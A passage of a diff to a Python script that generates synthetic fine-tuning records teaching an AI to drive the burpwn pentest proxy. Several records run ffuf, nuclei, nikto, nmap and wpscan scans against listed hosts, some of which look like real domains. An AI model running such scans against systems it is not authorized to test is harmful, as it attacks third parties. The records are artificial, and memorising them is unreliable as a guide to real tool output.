@@ -1,11 +1,13 @@
 #!/usr/bin/env python3
 """Deterministic generator for the burpwn LLM fine-tuning dataset.
 
-This script is the *source of truth* for ``dataset.jsonl``. It emits one JSON
+This script is the *source of truth* for the dataset files. It emits one JSON
 object per line. Every command name, flag, JSON envelope shape and MCP tool
 name encoded here was verified against the real ``burpwn`` debug binary
-(``target/debug/burpwn``) and the MCP server's typed parameter structs
-(``crates/burpwn-mcp/src/params.rs``) on 2026-06-13.
+(``target/debug/burpwn``) and the MCP server's typed parameter structs /
+handlers (``crates/burpwn-mcp/src/{params,server,handlers}.rs``) on
+2026-06-13 by actually running the binary and capturing the ``{ok,data,error}``
+envelopes (see README.md "How accuracy was grounded").
 
 Two example *styles* are produced, distinguished by the top-level ``"style"``
 key on every record (and mirrored in the system prompt):
@@ -13,37 +15,98 @@ key on every record (and mirrored in the system prompt):
 * ``"cli"``  — chat-format SFT examples. The user states a pentest goal in
   natural language; the assistant replies with the correct ``burpwn`` command(s),
   a short rationale, and (where useful) an interpretation of the JSON envelope.
+  Conversations may be single-shot (system/user/assistant) or **multi-turn**
+  (alternating user/assistant), always ending on an assistant turn.
 
-* ``"mcp"``  — tool-calling examples. The assistant turn carries a ``tool_calls``
-  array (OpenAI-compatible shape) naming a real burpwn MCP tool with correct
-  JSON arguments; a following ``tool`` role message carries the tool result, and
-  a final assistant turn interprets it.
+* ``"mcp"``  — tool-calling examples (OpenAI-compatible ``tool_calls`` shape).
+  ``system → user → assistant(tool_calls) → tool(result) → assistant(final)``,
+  and multi-turn variants chaining several call/result/interpret triples.
 
-Schema is documented in README.md. Usage::
+Usage::
 
-    python generate.py > dataset.jsonl      # (re)generate
-    python generate.py --validate           # validate ./dataset.jsonl
-    python generate.py --validate -          # validate stdin
+    python generate.py                       # write the split + combined files
+    python generate.py --stdout              # emit the combined dataset to stdout
+    python generate.py --target 3000         # aim for ~N examples (knob)
+    python generate.py --seed 7              # reproducible shuffle seed
+    python generate.py --validate            # validate ./dataset.jsonl
+    python generate.py --validate FILE       # validate a specific file ('-'=stdin)
 
-The generator is fully deterministic: no randomness, no network, stdlib only.
-Examples are emitted in a stable order so the output diff is reviewable.
+The generator is fully deterministic: no network, stdlib only, a fixed default
+seed, and a stable emission order — so regeneration is byte-identical on re-run.
+
+CRITICAL grounding facts (CLI and MCP envelopes DIFFER — do not conflate):
+
+  CLI ``--json`` wraps everything in ``{ok,data,error}``.
+    * ``req list``  → data is a BARE ARRAY of flow rows (id, authority, method,
+      path, status, protocol, scheme, dst_ip, dst_port, sni, intercepted,
+      ts_start, ts_end, workspace_id).
+    * ``req show``  → data is a flow-detail object: id, protocol, scheme,
+      dst_ip, dst_port, sni, intercepted, exec_id, client_addr, workspace_id,
+      request{method,authority,path,http_version,headers,body},
+      response{status,http_version,headers,body,timing_ms}. ``--raw`` adds
+      verbatim head+body to that text output.
+    * ``req search`` → data {flow_ids:[...]}.
+    * ``req replay`` → data {response:"HTTP/1.1 200 OK\\r\\n..."} (a STRING; no
+      separate status field).
+    * ``tag add``   → data {flow_id, name, tag_id}.
+    * ``note add``  → data {flow_id, note_id}.
+    * ``workspace new`` → data {id, name}; ``workspace list`` → BARE ARRAY.
+    * ``match-replace add`` → data {id}; ``match-replace list`` → BARE ARRAY of
+      {id,scope,match_kind,pattern,replacement,on_request,enabled}.
+    * ``match-replace rm|enable|disable`` are STILL not supported at runtime —
+      the subcommands parse but error: "match-replace rm/enable/disable are not
+      yet supported: the store writer exposes only add + list for rules".
+    * ``session new`` → {name}; ``session use`` → {active}; ``session rm`` →
+      {removed}; ``session list`` → {active, sessions:[...]}.
+    * ``intercept enable/disable`` → {type:"Ack"}; ``intercept list`` →
+      {type:"Intercepts",items:[...]}; ``intercept await`` →
+      {type:"Pending",item:{...}} or {type:"Pending",item:null} on timeout;
+      ``intercept forward/drop`` → {type:"Resolved",found:bool}. (The CLI
+      serializes the daemon's ControlResponse enum directly, hence "type".)
+    * ``exec --json`` writes {exit_code, exec_id, captured_request_ids} to FD 3.
+    * ``export pcap`` → {ok:false, error:"pcap export is not yet implemented
+      (use `export har`)"}.
+    * ``req show 999`` (missing) → plain text "burpwn: no such flow: 999".
+    * tag/note on a non-existent flow → sqlite FOREIGN KEY error.
+
+  MCP tool results (the handlers wrap differently — NO {ok,data,error}, NO
+  "type" tag):
+    * session_list → {sessions, active}; session_current → {active, db_exists}.
+    * req_list → {flows:[...], count:N}; req_show → flow-detail object (raw=true
+      adds raw_request/raw_response); req_search → {flow_ids:[...]}.
+    * workspace_list → {workspaces:[...]}; tag_list → {tags:[...]};
+      match_replace_list → {rules:[...]}.
+    * match_replace_add → {id}; tag_add → {tag_id}; note_add → {note_id};
+      workspace_new → {workspace_id}.
+    * intercept_enable/disable → {ok:true}; intercept_list → {intercepts:[...]};
+      await_intercept → {pending:true, intercept:{id,kind,host,method,path}} or
+      {pending:false}; intercept_forward/drop → {found:bool}.
+    * exec → {exit_code, captured_request_ids, exec_id}.
+    * any intercept tool with no daemon → error string starting "no burpwn proxy
+      daemon answering ...".
+  MCP arg names: req_search.query, req_show.{id,raw}, tag_add.{flow_id,name,color?},
+    note_add.{flow_id,body}, workspace_new.name, match_replace_add.{scope,kind,
+    pattern,replacement,on_request}, await_intercept.timeout_secs,
+    intercept_forward.{id,set_headers:[{name,value}],set_body?}, intercept_drop.id,
+    exec.{argv:[...],workspace?(name string),timeout_secs?}.
 """
 
 from __future__ import annotations
 
 import argparse
+import hashlib
 import json
+import os
+import random
 import sys
 from typing import Any, Iterable
 
 # --------------------------------------------------------------------------- #
-# Shared constants — grounded against the real binary / source.
+# Schema + system prompts.
 # --------------------------------------------------------------------------- #
 
-SCHEMA_VERSION = "1.0"
+SCHEMA_VERSION = "2.0"
 
-# System prompts. The model is taught it is an agent driving burpwn either via
-# the shell (cli) or via MCP tools (mcp).
 SYSTEM_CLI = (
     "You are a web-application penetration-testing assistant that drives "
     "burpwn, a transparent intercepting proxy and rootless sandbox for Linux. "
@@ -53,7 +116,8 @@ SYSTEM_CLI = (
     "listed, searched, inspected, replayed (Repeater), or intercepted live. "
     "Pass the global `--json` flag to get the machine-readable "
     "`{ok, data, error}` envelope. Respond with the exact burpwn command(s) to "
-    "run and a brief rationale; interpret JSON output when shown."
+    "run and a brief rationale; interpret JSON output when shown. Only operate "
+    "against systems you are authorized to test."
 )
 
 SYSTEM_MCP = (
@@ -62,8 +126,54 @@ SYSTEM_MCP = (
     "rootless sandbox; `exec` runs a command in a namespace whose traffic is "
     "captured to a per-session store, and the other tools query, replay and "
     "intercept those flows. Call the appropriate burpwn MCP tool with correct "
-    "JSON arguments to accomplish the user's goal, then interpret the result."
+    "JSON arguments to accomplish the user's goal, then interpret the result. "
+    "Only operate against systems you are authorized to test."
 )
+
+# The 19 MCP tools exposed by `burpwn mcp` (verified against server.rs).
+MCP_TOOL_NAMES = {
+    "session_list",
+    "session_current",
+    "req_list",
+    "req_show",
+    "req_search",
+    "workspace_list",
+    "workspace_new",
+    "tag_list",
+    "tag_add",
+    "note_add",
+    "match_replace_list",
+    "match_replace_add",
+    "intercept_enable",
+    "intercept_disable",
+    "intercept_list",
+    "await_intercept",
+    "intercept_forward",
+    "intercept_drop",
+    "exec",
+}
+
+# Known CLI tokens (subcommands + flags) for the lenient command linter.
+KNOWN_CLI_SUBCOMMANDS = {
+    "doctor", "init", "ca", "session", "exec", "req", "intercept",
+    "match-replace", "workspace", "tag", "note", "export",
+    "init", "list", "show", "search", "replay", "new", "use", "rm",
+    "enable", "disable", "await", "forward", "drop", "add", "har", "pcap",
+    "export",
+}
+KNOWN_CLI_FLAGS = {
+    "--json", "-g", "--global", "--agent", "--name", "--workspace",
+    "--timeout", "--session", "--host", "--status", "--method", "--protocol",
+    "--port", "--limit", "--offset", "--raw", "--set-header", "--set-body",
+    "--on", "-o", "--output", "-h", "--help", "-V", "--version",
+}
+
+# Tools the engine commonly drives via `exec` (the sandboxed pentest tooling).
+EXEC_TOOLS = {
+    "curl", "httpie", "http", "wget", "ffuf", "nuclei", "sqlmap", "nmap",
+    "nikto", "gobuster", "katana", "python3", "python", "feroxbuster", "dirb",
+    "ffuf", "amass", "subfinder", "httpx", "wpscan",
+}
 
 
 # --------------------------------------------------------------------------- #
@@ -74,20 +184,31 @@ SYSTEM_MCP = (
 def cli_example(
     *,
     tags: list[str],
-    user: str,
-    assistant: str,
+    turns: list[tuple[str, str]],
     system: str = SYSTEM_CLI,
 ) -> dict[str, Any]:
-    """Build a CLI-style chat record."""
+    """Build a CLI-style chat record from (role, content) turns.
+
+    ``turns`` is a list of (role, content) pairs for everything after the system
+    message: it must alternate user/assistant starting with user and ending with
+    assistant (enforced by the validator).
+    """
+    messages: list[dict[str, Any]] = [{"role": "system", "content": system}]
+    for role, content in turns:
+        messages.append({"role": role, "content": content})
     return {
         "schema_version": SCHEMA_VERSION,
         "style": "cli",
         "tags": tags,
-        "messages": [
-            {"role": "system", "content": system},
-            {"role": "user", "content": user},
-            {"role": "assistant", "content": assistant},
-        ],
+        "messages": messages,
+    }
+
+
+def _tool_call(call_id: str, name: str, args: dict[str, Any]) -> dict[str, Any]:
+    return {
+        "id": call_id,
+        "type": "function",
+        "function": {"name": name, "arguments": json.dumps(args, sort_keys=True)},
     }
 
 
@@ -95,1124 +216,2902 @@ def mcp_example(
     *,
     tags: list[str],
     user: str,
-    tool_name: str,
-    tool_args: dict[str, Any],
-    tool_result: Any,
-    assistant_final: str,
-    call_id: str = "call_1",
-    assistant_preamble: str = "",
+    steps: list[dict[str, Any]],
+    system: str = SYSTEM_MCP,
 ) -> dict[str, Any]:
-    """Build an MCP tool-calling record (OpenAI-compatible tool_calls shape).
+    """Build an MCP tool-calling record.
 
-    The assistant first emits a ``tool_calls`` turn (content may be empty), the
-    ``tool`` role returns the JSON result keyed by ``tool_call_id``, and a final
-    assistant turn interprets it in natural language.
+    ``steps`` is a list of dicts, each describing one tool round:
+        {"preamble": str, "tool": name, "args": {...}, "result": <json>,
+         "final": str}
+    The final ``final`` text of the LAST step is the closing assistant turn.
+    Intermediate steps' ``final`` becomes an assistant turn between tool rounds
+    (a multi-turn conversation). Call ids are assigned deterministically.
     """
+    messages: list[dict[str, Any]] = [
+        {"role": "system", "content": system},
+        {"role": "user", "content": user},
+    ]
+    n = len(steps)
+    for i, step in enumerate(steps):
+        cid = f"call_{i + 1}"
+        messages.append(
+            {
+                "role": "assistant",
+                "content": step.get("preamble", ""),
+                "tool_calls": [_tool_call(cid, step["tool"], step["args"])],
+            }
+        )
+        messages.append(
+            {
+                "role": "tool",
+                "tool_call_id": cid,
+                "name": step["tool"],
+                "content": json.dumps(step["result"], sort_keys=True),
+            }
+        )
+        # Each step closes with an assistant interpretation. For non-final steps
+        # this is an intermediate assistant turn; for the final step it closes
+        # the conversation.
+        messages.append({"role": "assistant", "content": step["final"]})
+        _ = (i, n)
     return {
         "schema_version": SCHEMA_VERSION,
         "style": "mcp",
         "tags": tags,
-        "messages": [
-            {"role": "system", "content": SYSTEM_MCP},
-            {"role": "user", "content": user},
-            {
-                "role": "assistant",
-                "content": assistant_preamble,
-                "tool_calls": [
-                    {
-                        "id": call_id,
-                        "type": "function",
-                        "function": {
-                            "name": tool_name,
-                            "arguments": json.dumps(tool_args, sort_keys=True),
-                        },
-                    }
-                ],
-            },
-            {
-                "role": "tool",
-                "tool_call_id": call_id,
-                "name": tool_name,
-                "content": json.dumps(tool_result, sort_keys=True),
-            },
-            {"role": "assistant", "content": assistant_final},
-        ],
+        "messages": messages,
     }
 
 
 # --------------------------------------------------------------------------- #
-# CLI-style scenarios (grounded envelopes from the real binary).
+# Target / scenario parameter space — realistic, not combinatorial padding.
 # --------------------------------------------------------------------------- #
 
 
-def cli_records() -> list[dict[str, Any]]:
+class Target:
+    def __init__(
+        self,
+        key: str,
+        host: str,
+        scheme: str = "https",
+        port: int = 443,
+        kind: str = "webapp",
+        dst_ip: str = "203.0.113.10",
+        protocol: str = "h2",
+        api_host: str | None = None,
+        desc: str = "",
+    ) -> None:
+        self.key = key
+        self.host = host
+        self.scheme = scheme
+        self.port = port
+        self.kind = kind  # webapp | rest | graphql | spa | internal
+        self.dst_ip = dst_ip
+        self.protocol = protocol
+        self.api_host = api_host or host
+        self.desc = desc
+
+    @property
+    def base(self) -> str:
+        if (self.scheme == "https" and self.port == 443) or (
+            self.scheme == "http" and self.port == 80
+        ):
+            return f"{self.scheme}://{self.host}"
+        return f"{self.scheme}://{self.host}:{self.port}"
+
+
+TARGETS = [
+    Target("juiceshop", "juice-shop.local", "https", 443, "spa",
+           dst_ip="10.10.0.21", protocol="h2",
+           desc="the OWASP Juice Shop SPA"),
+    Target("dvwa", "dvwa.local", "http", 80, "webapp",
+           dst_ip="10.10.0.22", protocol="h1",
+           desc="a DVWA instance"),
+    Target("restapi", "api.shopwave.io", "https", 443, "rest",
+           dst_ip="198.51.100.30", protocol="h2",
+           desc="a JSON REST API"),
+    Target("graphql", "gql.acme-corp.com", "https", 443, "graphql",
+           dst_ip="198.51.100.41", protocol="h2",
+           desc="a GraphQL API"),
+    Target("spa", "app.fintrack.dev", "https", 443, "spa",
+           dst_ip="203.0.113.55", protocol="h2",
+           desc="a React SPA + backend API"),
+    Target("internal", "intranet.corp.lan", "http", 8080, "internal",
+           dst_ip="10.0.5.12", protocol="h1",
+           desc="an internal intranet host"),
+    Target("altport", "staging.example.com", "https", 8443, "webapp",
+           dst_ip="192.0.2.77", protocol="h2",
+           desc="a staging site on a non-standard port"),
+    Target("blog", "blog.contoso.example", "https", 443, "webapp",
+           dst_ip="203.0.113.88", protocol="h2",
+           desc="a WordPress blog"),
+    Target("ecom", "shop.northwind.example", "https", 443, "webapp",
+           dst_ip="198.51.100.66", protocol="h2",
+           desc="an e-commerce storefront"),
+    Target("auth", "auth.fintrack.dev", "https", 443, "rest",
+           dst_ip="203.0.113.56", protocol="h2",
+           desc="an OAuth/identity service"),
+    Target("admin", "admin.intranet.corp.lan", "http", 8080, "internal",
+           dst_ip="10.0.5.13", protocol="h1",
+           desc="an internal admin panel"),
+    Target("mobapi", "mobile-api.shopwave.io", "https", 8443, "rest",
+           dst_ip="198.51.100.31", protocol="h2",
+           desc="a mobile-app backend API on a non-standard port"),
+    Target("legacy", "legacy.acme-corp.com", "http", 80, "webapp",
+           dst_ip="192.0.2.40", protocol="h1",
+           desc="a legacy HTTP-only site"),
+    Target("gqlpub", "api.devhub.example", "https", 443, "graphql",
+           dst_ip="203.0.113.99", protocol="h2",
+           desc="a public GraphQL endpoint"),
+    Target("ip", "192.0.2.123", "http", 80, "internal",
+           dst_ip="192.0.2.123", protocol="h1",
+           desc="a bare-IP internal service"),
+]
+
+
+def _t(key: str) -> Target:
+    for t in TARGETS:
+        if t.key == key:
+            return t
+    raise KeyError(key)
+
+
+# --------------------------------------------------------------------------- #
+# Family helpers — each returns a list of records. Families are parameterized
+# over the target space and over phrasing variants for genuine diversity.
+# --------------------------------------------------------------------------- #
+
+
+def fam_setup() -> list[dict[str, Any]]:
     out: list[dict[str, Any]] = []
 
-    # --- Prereqs / setup -------------------------------------------------- #
-    out.append(
-        cli_example(
-            tags=["setup", "doctor"],
-            user="Before I start, can you check my machine is ready to run burpwn?",
-            assistant=(
-                "Run the prerequisite probe:\n\n"
-                "```\nburpwn --json doctor\n```\n\n"
-                "This checks the unprivileged user namespace, the subuid entry, "
-                "`bwrap`, `nft`, `ip`, and whether the CA exists. A ready host "
-                "returns:\n\n"
-                '```json\n{"ok":true,"data":{"bwrap_present":true,"ca_present":true,'
-                '"ip_present":true,"missing":"","nft_present":true,"ready":true,'
-                '"subuid_present":true,"userns_enabled":true},"error":null}\n```\n\n'
-                "If `ready` is `false`, look at `ca_present` (fix with `burpwn ca "
-                "init`) and any `*_present` field that is `false`."
-            ),
-        )
+    doctor_ready = (
+        '{"ok":true,"data":{"bwrap_present":true,"ca_present":true,'
+        '"ip_present":true,"missing":"","nft_present":true,"ready":true,'
+        '"subuid_present":true,"userns_enabled":true},"error":null}'
     )
-    out.append(
-        cli_example(
-            tags=["setup", "doctor", "interpret"],
-            user=(
-                "I ran `burpwn --json doctor` and got "
-                '`{"ok":true,"data":{"bwrap_present":true,"ca_present":false,'
-                '"ip_present":true,"missing":"","nft_present":true,"ready":false,'
-                '"subuid_present":true,"userns_enabled":true},"error":null}`. '
-                "What do I do?"
-            ),
-            assistant=(
-                "Everything is present except the CA: `ca_present` is `false`, "
-                "which is why `ready` is `false`. Generate the root CA:\n\n"
-                "```\nburpwn ca init\n```\n\n"
-                "Then re-run `burpwn --json doctor`; `ca_present` and `ready` "
-                "should both be `true`."
-            ),
+
+    # doctor phrasing variants
+    for phrasing in [
+        "Before I start, can you check my machine is ready to run burpwn?",
+        "Is my host set up correctly for burpwn's sandbox?",
+        "Run burpwn's prerequisite check and tell me if anything is missing.",
+        "Sanity-check the environment before we begin the engagement.",
+    ]:
+        out.append(
+            cli_example(
+                tags=["setup", "doctor"],
+                turns=[
+                    (
+                        "user",
+                        phrasing,
+                    ),
+                    (
+                        "assistant",
+                        "Run the prerequisite probe:\n\n```\nburpwn --json doctor\n```\n\n"
+                        "It checks the unprivileged user namespace, the subuid entry, "
+                        "`bwrap`, `nft`, `ip`, and whether the CA exists. A ready host "
+                        f"returns:\n\n```json\n{doctor_ready}\n```\n\n"
+                        "If `ready` is `false`, look at `ca_present` (fix with "
+                        "`burpwn ca init`) and any `*_present` field that is `false`.",
+                    ),
+                ],
+            )
         )
-    )
+
+    # doctor interpret: each missing piece
+    missing_cases = [
+        ("ca_present", "burpwn ca init", "generate the root CA"),
+        ("userns_enabled", "sysctl kernel.unprivileged_userns_clone=1 (as root)",
+         "enable unprivileged user namespaces"),
+        ("nft_present", "install nftables (e.g. `dnf install nftables`)",
+         "install the `nft` binary"),
+        ("bwrap_present", "install bubblewrap (e.g. `dnf install bubblewrap`)",
+         "install `bwrap`"),
+        ("subuid_present", "add a subuid range for your user in /etc/subuid",
+         "add the subuid mapping"),
+    ]
+    for field, fix, human in missing_cases:
+        fields = {
+            "bwrap_present": True, "ca_present": True, "ip_present": True,
+            "nft_present": True, "subuid_present": True, "userns_enabled": True,
+        }
+        fields[field] = False
+        env = {
+            "ok": True,
+            "data": {**fields, "missing": "", "ready": False},
+            "error": None,
+        }
+        out.append(
+            cli_example(
+                tags=["setup", "doctor", "interpret", "recovery"],
+                turns=[
+                    (
+                        "user",
+                        f"`burpwn --json doctor` returned "
+                        f"`{json.dumps(env, sort_keys=True)}`. What's wrong?",
+                    ),
+                    (
+                        "assistant",
+                        f"`{field}` is `false`, which forces `ready:false`. You need to "
+                        f"{human}: {fix}. Then re-run `burpwn --json doctor` and confirm "
+                        f"`{field}` and `ready` are both `true`.",
+                    ),
+                ],
+            )
+        )
+
+    # ca init / export
     out.append(
         cli_example(
             tags=["setup", "ca"],
-            user="Generate the MITM root CA and tell me where it lives.",
-            assistant=(
-                "```\nburpwn ca init\n```\n\n"
-                "It is idempotent (generates the CA only if absent) and reports the "
-                "path:\n\n"
-                '```json\n{"ok":true,"data":{"ca_pem":"/home/me/.local/share/burpwn/'
-                'ca.pem"},"error":null}\n```'
-            ),
+            turns=[
+                ("user", "Generate the MITM root CA and tell me where it lives."),
+                (
+                    "assistant",
+                    "```\nburpwn ca init\n```\n\nIt is idempotent (creates the CA only "
+                    "if absent) and reports the path:\n\n```json\n"
+                    '{"ok":true,"data":{"ca_pem":"/home/me/.local/share/burpwn/ca.pem"},'
+                    '"error":null}\n```',
+                ),
+            ],
         )
     )
     out.append(
         cli_example(
             tags=["setup", "ca", "export"],
-            user="I need the CA certificate as PEM to install in a browser profile.",
-            assistant=(
-                "Print the CA certificate to stdout (redirect it to a file if you "
-                "want):\n\n"
-                "```\nburpwn ca export > burpwn-ca.pem\n```\n\n"
-                "`ca export` writes the verbatim PEM (`-----BEGIN CERTIFICATE-----` …), "
-                "not a JSON envelope, so it is safe to pipe directly into a trust store."
-            ),
+            turns=[
+                ("user", "I need the CA certificate as PEM to trust it in a browser profile."),
+                (
+                    "assistant",
+                    "Print the CA to stdout and redirect it:\n\n```\nburpwn ca export > "
+                    "burpwn-ca.pem\n```\n\n`ca export` writes the verbatim PEM "
+                    "(`-----BEGIN CERTIFICATE-----` …), not a JSON envelope, so it pipes "
+                    "straight into a trust store.",
+                ),
+            ],
         )
     )
-    out.append(
-        cli_example(
-            tags=["setup", "init", "agent"],
-            user="Hook burpwn into Claude Code so its shell commands run in the sandbox.",
-            assistant=(
-                "Install the agent hook (no argument defaults to the Claude Code "
-                "hook):\n\n"
-                "```\nburpwn init --agent claude\n```\n\n"
-                "Result:\n\n"
-                '```json\n{"ok":true,"data":{"installed":[{"action":"Installed",'
-                '"agent":"claude-code","path":"/home/me/.claude/settings.json"}]},'
-                '"error":null}\n```\n\n'
-                "Use `burpwn init -g` instead to install a generic global shell hook "
-                "(patches `~/.bashrc` and `~/.zshrc`) that covers any agent."
-            ),
+    for agent, agent_id, path in [
+        ("claude", "claude-code", "/home/me/.claude/settings.json"),
+        ("cursor", "cursor", "/home/me/.cursor/settings.json"),
+    ]:
+        out.append(
+            cli_example(
+                tags=["setup", "init", "agent"],
+                turns=[
+                    (
+                        "user",
+                        f"Hook burpwn into {agent} so its shell commands run in the sandbox.",
+                    ),
+                    (
+                        "assistant",
+                        f"Install the agent hook:\n\n```\nburpwn init --agent {agent}\n```\n\n"
+                        "Result:\n\n```json\n"
+                        f'{{"ok":true,"data":{{"installed":[{{"action":"Installed",'
+                        f'"agent":"{agent_id}","path":"{path}"}}]}},"error":null}}\n```\n\n'
+                        "Use `burpwn init -g` instead for a generic global shell hook "
+                        "(patches `~/.bashrc` and `~/.zshrc`) that covers any agent.",
+                    ),
+                ],
+            )
         )
-    )
+    return out
 
-    # --- Sessions --------------------------------------------------------- #
-    out.append(
-        cli_example(
-            tags=["session", "setup"],
-            user="Start a fresh session for the acme.com engagement and make it active.",
-            assistant=(
-                "Create the session, then switch to it:\n\n"
-                "```\nburpwn session new --name acme\nburpwn session use acme\n```\n\n"
-                "`session new` returns `{\"ok\":true,\"data\":{\"name\":\"acme\"},"
-                "\"error\":null}` and `session use` confirms with "
-                "`{\"ok\":true,\"data\":{\"active\":\"acme\"},\"error\":null}`. All "
-                "subsequent `exec`/`req` operate on the active session unless you pass "
-                "`--session`."
-            ),
+
+def fam_sessions() -> list[dict[str, Any]]:
+    out: list[dict[str, Any]] = []
+    names = ["acme", "shopwave", "fintrack", "redteam-q3", "client-x"]
+    for name in names:
+        out.append(
+            cli_example(
+                tags=["session", "setup"],
+                turns=[
+                    (
+                        "user",
+                        f"Start a fresh session for the {name} engagement and make it active.",
+                    ),
+                    (
+                        "assistant",
+                        "Create it, then switch to it:\n\n"
+                        f"```\nburpwn session new --name {name}\nburpwn session use {name}\n```\n\n"
+                        f'`session new` returns `{{"ok":true,"data":{{"name":"{name}"}},'
+                        f'"error":null}}` and `session use` confirms with '
+                        f'`{{"ok":true,"data":{{"active":"{name}"}},"error":null}}`. All '
+                        "subsequent `exec`/`req` use the active session unless you pass "
+                        "`--session`.",
+                    ),
+                ],
+            )
         )
-    )
     out.append(
         cli_example(
             tags=["session", "list"],
-            user="Which burpwn sessions exist and which one am I on?",
-            assistant=(
-                "```\nburpwn --json session list\n```\n\n"
-                "The active session is named in `data.active`:\n\n"
-                '```json\n{"ok":true,"data":{"active":"acme","sessions":["default",'
-                '"acme","probe"]},"error":null}\n```'
-            ),
+            turns=[
+                ("user", "Which burpwn sessions exist and which one am I on?"),
+                (
+                    "assistant",
+                    "```\nburpwn --json session list\n```\n\nThe active session is in "
+                    '`data.active`:\n\n```json\n{"ok":true,"data":{"active":"acme",'
+                    '"sessions":["default","acme","shopwave"]},"error":null}\n```',
+                ),
+            ],
         )
     )
     out.append(
         cli_example(
             tags=["session", "rm"],
-            user="Delete the old 'probe' session and its database.",
-            assistant=(
-                "```\nburpwn session rm probe\n```\n\n"
-                "This removes the session's SQLite store and runtime files. Note you "
-                "cannot remove the session you are currently `use`-ing without switching "
-                "away first."
-            ),
+            turns=[
+                ("user", "Delete the old 'probe' session and its database."),
+                (
+                    "assistant",
+                    "```\nburpwn session rm probe\n```\n\nReturns "
+                    '`{"ok":true,"data":{"removed":"probe"},"error":null}` and deletes the '
+                    "session's SQLite store and runtime files. Switch away first if it is "
+                    "the active session.",
+                ),
+            ],
         )
     )
+    return out
 
-    # --- exec / recon ----------------------------------------------------- #
+
+def fam_exec_recon() -> list[dict[str, Any]]:
+    """Recon via `exec` across targets and tools — the heart of the dataset."""
+    out: list[dict[str, Any]] = []
+
+    # curl fetch (single + interpret) across targets
+    for t in TARGETS:
+        out.append(
+            cli_example(
+                tags=["exec", "recon", "curl", t.key],
+                turns=[
+                    (
+                        "user",
+                        f"Fetch the {t.host} homepage through the proxy so it gets captured.",
+                    ),
+                    (
+                        "assistant",
+                        f"```\nburpwn exec -- curl -s {t.base}/\n```\n\n"
+                        "Everything after `--` runs inside the sandbox; its network is "
+                        "forced through burpwn's MITM proxy, so the request/response (plus "
+                        "the DNS lookups) land in the session store. The command's own "
+                        "stdout passes through untouched. Add `--json` to also get the exec "
+                        "envelope `{exit_code, exec_id, captured_request_ids}` on fd 3.",
+                    ),
+                ],
+            )
+        )
+
+    # exec envelope interpret variants
+    for ids, t in [([12, 13, 14], _t("juiceshop")), ([50, 51, 52], _t("restapi")),
+                   ([7, 8, 9], _t("dvwa"))]:
+        env = {
+            "ok": True,
+            "data": {
+                "captured_request_ids": ids,
+                "exec_id": f"exec-3608212-0-178136375962129707{ids[0]}",
+                "exit_code": 0,
+            },
+            "error": None,
+        }
+        out.append(
+            cli_example(
+                tags=["exec", "recon", "envelope", "interpret", t.key],
+                turns=[
+                    (
+                        "user",
+                        f"I ran `burpwn --json exec -- curl -s -o /dev/null {t.base}/` "
+                        f"and fd 3 gave me `{json.dumps(env, sort_keys=True)}`. What now?",
+                    ),
+                    (
+                        "assistant",
+                        f"Clean exit (`exit_code:0`); burpwn captured {len(ids)} flows this "
+                        f"run: ids {', '.join(map(str, ids))} (typically the A/AAAA DNS "
+                        f"queries plus the HTTP request). Inspect the HTTP one — usually the "
+                        f"highest id — with `burpwn req show {ids[-1]}`. The DNS ones are the "
+                        f"`QUERY` flows. Correlate the whole run later via the `exec_id`.",
+                    ),
+                ],
+            )
+        )
+
+    # tool-specific recon scenarios
+    tool_scenarios = [
+        ("ffuf", "{base}/FUZZ", "ffuf -u {base}/FUZZ -w wordlist.txt -mc 200,301,302,403",
+         600, "content discovery",
+         "Every probe ffuf makes is captured, so afterwards "
+         "`burpwn req list --host {host} --status 200` reviews the hits with their real "
+         "responses."),
+        ("gobuster", "{base}", "gobuster dir -u {base} -w wordlist.txt",
+         600, "directory brute-forcing",
+         "Each request gobuster sends is captured; filter the hits with "
+         "`burpwn req list --host {host}`."),
+        ("feroxbuster", "{base}", "feroxbuster -u {base} -w wordlist.txt --silent",
+         600, "recursive content discovery",
+         "Review the recursion's hits with `burpwn req list --host {host} --status 200`."),
+        ("nuclei", "{base}", "nuclei -u {base} -silent",
+         300, "a templated vuln scan",
+         "Use `burpwn req list --host {host}` to see exactly which requests nuclei sent "
+         "and the live responses."),
+        ("nikto", "{base}", "nikto -h {base}",
+         600, "a Nikto web-server scan",
+         "Nikto's probes are all captured; `burpwn req search` the responses for the "
+         "findings it flags."),
+        ("katana", "{base}", "katana -u {base} -silent",
+         300, "crawling",
+         "The crawl's flows are captured; `burpwn req list --host {host}` to triage the "
+         "discovered endpoints."),
+        ("nmap", "{host}", "nmap -sT -Pn {host}",
+         300, "a TCP connect port scan",
+         "Note nmap's raw connects appear as `rawtcp`/`dns` flows, not HTTP — review with "
+         "`burpwn req list --protocol rawtcp --host {host}`."),
+        ("wpscan", "{base}", "wpscan --url {base} --no-update",
+         600, "a WordPress scan",
+         "WPScan's enumeration requests are captured under the session for later review."),
+    ]
+    for tool, _urlpat, cmdpat, to, desc, note in tool_scenarios:
+        for t in (TARGETS[0], TARGETS[2], TARGETS[5]):
+            cmd = cmdpat.format(base=t.base, host=t.host)
+            note_r = note.format(host=t.host)
+            out.append(
+                cli_example(
+                    tags=["exec", "recon", "tool", tool, t.key],
+                    turns=[
+                        (
+                            "user",
+                            f"Run {tool} {desc} against {t.host} through burpwn.",
+                        ),
+                        (
+                            "assistant",
+                            f"Wrap the whole {tool} invocation after `--` and give it a "
+                            f"generous timeout since it's long-running:\n\n"
+                            f"```\nburpwn exec --timeout {to} -- {cmd}\n```\n\n{note_r}",
+                        ),
+                    ],
+                )
+            )
+
+    # httpie / wget / python requests variants
     out.append(
         cli_example(
-            tags=["exec", "recon", "curl"],
-            user="Fetch the acme.com homepage through the proxy so it gets captured.",
-            assistant=(
-                "```\nburpwn exec -- curl -s https://acme.com/\n```\n\n"
-                "Everything after `--` is the command run inside the sandbox; its "
-                "network is forced through burpwn's MITM proxy, so the request/response "
-                "(plus the DNS lookups) land in the session store. The command's own "
-                "stdout passes through untouched. Add `--json` to also get the exec "
-                "envelope `{exit_code, exec_id, captured_request_ids}` on fd 3."
-            ),
+            tags=["exec", "recon", "httpie", "restapi"],
+            turns=[
+                ("user", "Use HTTPie to POST a login to the shopwave API under the sandbox."),
+                (
+                    "assistant",
+                    "```\nburpwn exec -- http POST https://api.shopwave.io/v1/login "
+                    "email=user@x.io password=hunter2\n```\n\nHTTPie's request and the JSON "
+                    "response are captured; `burpwn req list --host api.shopwave.io "
+                    "--method POST` then `burpwn req show <id>` to read the token in the "
+                    "response.",
+                ),
+            ],
         )
     )
     out.append(
         cli_example(
-            tags=["exec", "recon", "envelope", "interpret"],
-            user=(
-                "I ran `burpwn --json exec -- curl -s -o /dev/null https://acme.com/` "
